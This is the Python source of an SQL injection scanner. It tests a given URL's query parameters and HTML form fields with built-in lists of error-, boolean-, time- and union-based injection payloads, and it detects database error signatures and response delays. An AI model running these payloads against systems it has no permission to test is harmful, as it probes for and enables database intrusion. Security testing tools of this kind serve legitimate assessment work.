#!/usr/bin/env python3
"""
SQL Injection Scanner
Detects SQL injection vulnerabilities
"""

from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import argparse
from colorama import Fore, Style, init
import json
import os
from typing import List, Dict
from bs4 import BeautifulSoup
import time
import re
from utils.http_client import HttpClient
from utils.targets import normalize_url

init(autoreset=True)

class SQLiScanner:
    def __init__(self, target_url: str, output_dir: str = "./results"):
        self.target_url = normalize_url(target_url)
        self.output_dir = output_dir
        self.vulnerabilities: List[Dict] = []
        
        os.makedirs(output_dir, exist_ok=True)
        
        # SQL injection payloads
        self.payloads = {
            # Error-based
            "error_based": [
                "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
                "' OR '1'='1' --", "' OR '1'='1' /*",
                "admin' --", "admin' #", "admin'/*",
                "' UNION SELECT NULL--",
                "' AND 1=CONVERT(int, (SELECT @@version))--",
            ],
            
            # Boolean-based
            "boolean_based": [
                "' AND '1'='1", "' AND '1'='2",
                "' OR 1=1--", "' OR 1=2--",
                "1' AND '1'='1", "1' AND '1'='2",
            ],
            
            # Time-based
            "time_based": [
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR SLEEP(5)--",
                "' OR pg_sleep(5)--",
                "1' AND SLEEP(5)--",
                "'; SELECT SLEEP(5)--",
            ],
            
            # Union-based
            "union_based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL--",
            ]
        }
        
        # SQL error signatures
        self.error_signatures = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.*SQL Server",
            r"OLE DB.*SQL Server",
            r"SQLServer JDBC Driver",
            r"Microsoft SQL Native Client",
            r"ODBC SQL Server Driver",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Warning.*ora_.*",
        ]
        self.http = HttpClient(timeout=10)
    
    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════╗
║      SQL Injection Scanner            ║
║     Target: {self.target_url[:24]:<24}║
╚═══════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)
    
    def find_forms(self, url: str) -> List[Dict]:
        """Find all forms on a page"""
        try:
            response = self.http.get(url)
            if not response:
                return []
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {
                    'action': form.get('action'),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    if input_name:
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name
                        })
                
                forms.append(form_details)
            
            return forms
        except Exception as e:
            return []
    
    def check_sql_error(self, response_text: str) -> bool:
        """Check if response contains SQL error messages"""
        for signature in self.error_signatures:
            if re.search(signature, response_text, re.IGNORECASE):
                return True
        return False
    
    def test_error_based(self, url: str, param: str, method: str = 'GET', data: Dict = None) -> List[Dict]:
        """Test for error-based SQL injection"""
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}[*] Testing error-based SQLi on parameter: {param}{Style.RESET_ALL}")
        
        for payload in self.payloads['error_based']:
            test_data = data.copy() if data else {}
            
            if method == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                try:
                    response = self.http.get(test_url)
                    if not response:
                        continue
                    
                    if self.check_sql_error(response.text):
                        vuln = {
                            'type': 'Error-based SQL Injection',
                            'url': url,
                            'method': method,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'Critical'
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] VULNERABILITY FOUND!{Style.RESET_ALL}")
                        print(f"    Parameter: {param}")
                        print(f"    Payload: {payload}")
                        return vulnerabilities  # Found vulnerability
                
                except Exception as e:
                    pass
            
            else:  # POST
                test_data[param] = payload
                try:
                    response = self.http.post(url, data=test_data)
                    if not response:
                        continue
                    
                    if self.check_sql_error(response.text):
                        vuln = {
                            'type': 'Error-based SQL Injection',
                            'url': url,
                            'method': method,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'Critical'
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] VULNERABILITY FOUND!{Style.RESET_ALL}")
                        print(f"    Parameter: {param}")
                        print(f"    Payload: {payload}")
                        return vulnerabilities
                
                except Exception as e:
                    pass
        
        return vulnerabilities
    
    def test_boolean_based(self, url: str, param: str, method: str = 'GET', data: Dict = None) -> List[Dict]:
        """Test for boolean-based blind SQL injection"""
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}[*] Testing boolean-based SQLi on parameter: {param}{Style.RESET_ALL}")
        
        # Get baseline responses
        try:
            if method == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                
                # True condition
                params[param] = [self.payloads['boolean_based'][0]]
                true_query = urlencode(params, doseq=True)
                true_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, true_query, parsed.fragment
                ))
                true_response = self.http.get(true_url)
                
                # False condition
                params[param] = [self.payloads['boolean_based'][1]]
                false_query = urlencode(params, doseq=True)
                false_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, false_query, parsed.fragment
                ))
                false_response = self.http.get(false_url)
                if not true_response or not false_response:
                    return vulnerabilities
                
                # Compare responses
                if len(true_response.text) != len(false_response.text):
                    vuln = {
                        'type': 'Boolean-based Blind SQL Injection',
                        'url': url,
                        'method': method,
                        'parameter': param,
                        'payload': 'Boolean-based payloads',
                        'severity': 'High'
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Fore.RED}[!] VULNERABILITY FOUND!{Style.RESET_ALL}")
                    print(f"    Parameter: {param}")
                    print(f"    Type: Boolean-based Blind SQLi")
            
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def test_time_based(self, url: str, param: str, method: str = 'GET', data: Dict = None) -> List[Dict]:
        """Test for time-based blind SQL injection"""
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}[*] Testing time-based SQLi on parameter: {param}{Style.RESET_ALL}")
        
        for payload in self.payloads['time_based'][:3]:  # Test subset to save time
            if method == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                try:
                    start_time = time.time()
                    response = self.http.get(test_url, timeout=15)
                    elapsed_time = time.time() - start_time
                    
                    # If response took significantly longer (>4 seconds), likely vulnerable
                    if elapsed_time > 4:
                        vuln = {
                            'type': 'Time-based Blind SQL Injection',
                            'url': url,
                            'method': method,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'High',
                            'response_time': f"{elapsed_time:.2f}s"
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] VULNERABILITY FOUND!{Style.RESET_ALL}")
                        print(f"    Parameter: {param}")
                        print(f"    Response time: {elapsed_time:.2f}s")
                        return vulnerabilities
                
                except Exception as e:
                    pass
        
        return vulnerabilities
    
    def scan_url_parameters(self, url: str) -> List[Dict]:
        """Scan URL parameters for SQL injection"""
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        for param in params.keys():
            # Test error-based
            vulns = self.test_error_based(url, param, 'GET')
            vulnerabilities.extend(vulns)
            
            # Test boolean-based
            vulns = self.test_boolean_based(url, param, 'GET')
            vulnerabilities.extend(vulns)
            
            # Test time-based (slower, so do last)
            # vulns = self.test_time_based(url, param, 'GET')
            # vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    def scan_forms(self, url: str) -> List[Dict]:
        """Scan forms for SQL injection"""
        vulnerabilities = []
        forms = self.find_forms(url)
        
        print(f"{Fore.CYAN}[*] Found {len(forms)} forms{Style.RESET_ALL}")
        
        for form in forms:
            action = urljoin(url, form['action']) if form['action'] else url
            
            for input_field in form['inputs']:
                if input_field['type'] not in ['submit', 'button']:
                    param = input_field['name']
                    
                    # Prepare form data
                    data = {inp['name']: 'test' for inp in form['inputs'] 
                           if inp['type'] not in ['submit', 'button']}
                    
                    # Test error-based
                    vulns = self.test_error_based(action, param, form['method'].upper(), data)
                    vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    def save_results(self):
        """Save scan results"""
        domain = urlparse(self.target_url).netloc
        output_file = os.path.join(self.output_dir, f"{domain}_sqli_scan.json")
        
        data = {
            "target": self.target_url,
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities
        }
        
        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"\n{Fore.CYAN}[*] Results saved to: {output_file}{Style.RESET_ALL}")
    
    def print_summary(self):
        """Print scan summary"""
        print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SQL Injection Scan Summary{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Total vulnerabilities found: {len(self.vulnerabilities)}{Style.RESET_ALL}")
        
        critical = sum(1 for v in self.vulnerabilities if v['severity'] == 'Critical')
        high = sum(1 for v in self.vulnerabilities if v['severity'] == 'High')
        
        if critical > 0:
            print(f"{Fore.RED}Critical severity: {critical}{Style.RESET_ALL}")
        if high > 0:
            print(f"{Fore.RED}High severity: {high}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
    
    def run(self):
        """Execute SQL injection scan"""
        self.print_banner()
        
        # Scan URL parameters
        url_vulns = self.scan_url_parameters(self.target_url)
        self.vulnerabilities.extend(url_vulns)
        
        # Scan forms
        form_vulns = self.scan_forms(self.target_url)
        self.vulnerabilities.extend(form_vulns)
        
        self.print_summary()
        self.save_results()


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-o", "--output", default="./results", help="Output directory")
    
    args = parser.parse_args()
    
    scanner = SQLiScanner(args.url, args.output)
    scanner.run()


if __name__ == "__main__":
    main()
